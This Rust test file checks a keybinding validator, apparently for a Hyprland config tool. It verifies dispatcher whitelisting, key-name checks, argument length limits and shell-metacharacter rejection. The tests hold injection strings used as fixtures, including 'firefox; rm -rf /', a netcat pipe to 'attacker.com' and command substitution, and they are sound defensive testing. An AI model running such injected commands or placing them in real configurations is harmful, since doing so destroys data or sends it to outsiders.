// Copyright 2025 Eric Jingryd (tidynest@proton.me)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use crate::core::{types::{BindType, KeyCombo, Keybinding, Modifier}, validator::{check_shell_metacharacters, validate_dispatcher, validate_key, validate_keybinding, ValidationError}};

#[test]
fn test_valid_dispatchers() {
    assert!(validate_dispatcher("exec").is_ok());
    assert!(validate_dispatcher("workspace").is_ok());
    assert!(validate_dispatcher("killactive").is_ok());
    assert!(validate_dispatcher("togglefloating").is_ok());
}

#[test]
fn test_dispatcher_case_insensitive() {
    assert!(validate_dispatcher("EXEC").is_ok());
    assert!(validate_dispatcher("Workspace").is_ok());
}

#[test]
fn test_invalid_dispatcher() {
    assert_eq!(
        validate_dispatcher("evil_command"),
        Err(ValidationError::InvalidDispatcher("evil_command".to_string()))
    );
    assert_eq!(
        validate_dispatcher("rm"),
        Err(ValidationError::InvalidDispatcher("rm".to_string()))
    );
}

#[test]
fn test_detects_semicolon_injection() {
    let malicious = "firefox; rm -rf /";
    assert!(matches!(
        check_shell_metacharacters(malicious),
        Err(ValidationError::ShellMetacharacters(_))
    ));
}

#[test]
fn test_detects_pipe_injection() {
    let malicious = "firefox | nc attacker.com 1234";
    assert!(check_shell_metacharacters(malicious).is_err());
}

#[test]
fn test_detects_backtick_injection() {
    let malicious = "firefox `whoami`";
    assert!(check_shell_metacharacters(malicious).is_err());
}

#[test]
fn test_detects_dollar_sign_injection() {
    let malicious = "firefox $(whoami)";
    assert!(check_shell_metacharacters(malicious).is_err());
}

#[test]
fn test_allows_safe_arguments() {
    assert!(check_shell_metacharacters("firefox").is_ok());
    assert!(check_shell_metacharacters("firefox --new-window").is_ok());
    assert!(check_shell_metacharacters("wofi --show drun").is_ok());
    assert!(check_shell_metacharacters("kitty -e nvim").is_ok());
}

#[test]
fn test_valid_keys() {
    assert!(validate_key("K").is_ok());
    assert!(validate_key("Return").is_ok());
    assert!(validate_key("F1").is_ok());
    assert!(validate_key("Escape").is_ok());
    assert!(validate_key("Space").is_ok());
    assert!(validate_key("Up").is_ok());
}

#[test]
fn test_invalid_keys() {
    assert!(validate_key("K;L").is_err());
    assert!(validate_key("../etc/passwd").is_err());
    assert!(validate_key("KEY WITH SPACES").is_err());
}

#[test]
fn test_argument_length_limit() {
    let long_arg = "a".repeat(1001);
    let binding = Keybinding {
        key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
        bind_type: BindType::Bind,
        dispatcher: "exec".to_string(),
        args: Some(long_arg),
    };

    assert!(matches!(
        validate_keybinding(&binding),
        Err(ValidationError::ArgumentTooLong(1001))
    ));
}

#[test]
fn test_validates_complete_binding_success() {
    let binding = Keybinding {
        key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
        bind_type: BindType::Bind,
        dispatcher: "exec".to_string(),
        args: Some("firefox".to_string()),
    };

    assert!(validate_keybinding(&binding).is_ok());
}

#[test]
fn test_validates_complete_binding_invalid_dispatcher() {
    let binding = Keybinding {
        key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
        bind_type: BindType::Bind,
        dispatcher: "evil".to_string(),
        args: Some("firefox".to_string()),
    };

    assert!(matches!(
        validate_keybinding(&binding),
        Err(ValidationError::InvalidDispatcher(_))
    ));
}

#[test]
fn test_validates_complete_binding_shell_injection() {
    let binding = Keybinding {
        key_combo: KeyCombo::new(vec![Modifier::Super], "K"),
        bind_type: BindType::Bind,
        dispatcher: "exec".to_string(),
        args: Some("firefox; rm -rf /".to_string()),
    };

    assert!(matches!(
        validate_keybinding(&binding),
        Err(ValidationError::ShellMetacharacters(_))
    ));
}

